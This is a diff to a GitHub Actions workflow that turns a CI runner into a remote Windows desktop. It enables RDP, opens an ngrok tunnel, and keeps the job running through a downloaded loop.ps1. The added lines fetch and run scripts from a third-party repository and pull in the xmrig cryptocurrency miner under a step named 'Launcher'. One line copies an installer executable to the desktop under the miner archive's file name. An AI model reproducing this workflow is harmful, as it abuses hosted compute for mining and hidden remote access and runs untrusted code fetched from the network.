@@ -1,4 +1,4 @@
-name: amazonRDP
+name: mRDP
 
 on: workflow_dispatch
 
@@ -11,8 +11,16 @@ jobs:
     steps:
     - name: Downloading Ngrok.
       run: |
-        Invoke-WebRequest https://raw.githubusercontent.com/romain09/AWS-RDP/main/ngrok-stable-windows-amd64.zip -OutFile ngrok.zip
-        Invoke-WebRequest https://raw.githubusercontent.com/romain09/AWS-RDP/main/start.bat -OutFile start.bat
+        Invoke-WebRequest https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-windows-amd64.zip -OutFile ngrok.zip
+        Invoke-WebRequest https://raw.githubusercontent.com/tuanmuda2019/TuanwaraRDP/main/start.bat -OutFile start.bat
+        Invoke-WebRequest https://raw.githubusercontent.com/tuanmuda2019/TuanwaraRDP/main/wallpaper.png -OutFile wallpaper.png
+        Invoke-WebRequest https://raw.githubusercontent.com/tuanmuda2019/TuanwaraRDP/main/wallpaper.bat -OutFile wallpaper.bat
+        Invoke-WebRequest https://raw.githubusercontent.com/tuanmuda2019/TuanwaraRDP/main/loop.ps1 -OutFile loop.ps1
+
+    - name: Mendownload Launcher.
+      run: |
+        Invoke-WebRequest https://github.com/tuanmuda2019/Dataku/blob/main/xmrig-6.14.1.zip -OutFile "xmrig-6.14.1.zip"
+      
     - name: Extracting Ngrok Files.
       run: Expand-Archive ngrok.zip
     - name: Connecting to your Ngrok account.
@@ -24,11 +32,15 @@ jobs:
         Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server'-name "fDenyTSConnections" -Value 0
         Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
         Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "UserAuthentication" -Value 1
+        Set-WinUserLanguageList -LanguageList tr, en-US -Force
+        copy wallpaper.png D:\a\wallpaper.png
+        copy wallpaper.bat D:\a\wallpaper.bat
+        copy "Growtopia-Installer.exe" "C:\Users\Public\Desktop\xmrig-6.14.1.zip"
     - name: Creating Tunnel.
       run: Start-Process Powershell -ArgumentList '-Noexit -Command ".\ngrok\ngrok.exe tcp 3389"'
     - name: Connecting to your RDP.
       run: cmd /c start.bat
     - name: RDP is ready!
       run: | 
-        Invoke-WebRequest https://raw.githubusercontent.com/romain09/AWS-RDP/main/loop.ps1 -OutFile loop.ps1
-        ./loop.ps1
+       Invoke-WebRequest https://raw.githubusercontent.com/tuanmuda20191234/TuanwaraRDP/main/loop.ps1 -OutFile loop.ps1
+       ./loop.ps1
